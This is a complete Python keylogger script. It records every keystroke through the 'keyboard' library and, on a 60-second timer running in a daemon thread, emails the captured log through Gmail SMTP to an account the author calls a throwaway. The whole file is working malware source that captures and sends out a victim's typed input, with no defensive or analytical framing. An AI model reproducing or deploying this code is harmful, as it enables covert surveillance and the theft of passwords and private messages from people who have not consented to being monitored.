import keyboard # keylogging
import smtplib # sending emails
# sending logs per period of time
from threading import Timer
from datetime import datetime

# includes email address and pw of my throwaway account
import config

# global parameters
REPORT_INTERVAL = 60
EMAIL_ADDRESS = config.EMAIL_ADDRESS
EMAIL_PW = config.EMAIL_PW

class Keylogger:
    def __init__(self, interval, report_mode='email'):
        self.interval = interval
        self.report_mode = report_mode
        # the log of all keystrokes within the interval...
        self.log = ""
        # recording start and end dates
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # use keyboard's on_release() function, calling this callback function on
    # every KEY_UP event, recording it to the existing log.
    def callback(self, event):
        # in keyboard, event is each keystroke
        name = event.name
        # TODO: add input parsing later

        self.log += name
    
    def send_email(self, email, pwd, msg):
        try:
            # using starttls()
            server = smtplib.SMTP(host='smtp.gmail.com', port=587)
            server.starttls()

            # login to email account provided
            server.login(email, pwd)
            # send the log as a message
            server.sendmail(email, email, msg)
        except Exception as e:
            print(e)    
        finally:
            # terminate
            server.quit()

    # driver function, calls itself recursively using Timer to keep reporting on
    # keypress status
    def driver(self):
        if self.log:
            # if a keypress has been recorded in the interval
            self.end_dt = datetime.now()

            # if statement is relevant if I ever want to include saving to local
            # log file, as opposed to email
            if self.report_mode == 'email':
                self.send_email(EMAIL_ADDRESS, EMAIL_PW, self.log)

            # update start date of new log
            self.start_dt = datetime.now()
        # reset log!
        self.log = ''
        # call itself after a certain time
        timer = Timer(interval=self.interval, function=self.driver)
        # setting the thread as daemon means it dies when main thread dies
        timer.daemon = True
        timer.start()

    # calls the callback, defined above
    # starts the keylogger and runs the driver
    def start(self):
        self.start_dt = datetime.now()
        # begins keylogger
        keyboard.on_release(callback=self.callback)
        # begin reporting on logs
        self.driver()
        # block curr thread TODO: experiment with htis
        # should keep recording keystrokes until ctrl+c is pressed...
        keyboard.wait()

if __name__ == '__main__':
    my_logger = Keylogger(interval=REPORT_INTERVAL, report_mode='email')
    my_logger.start()
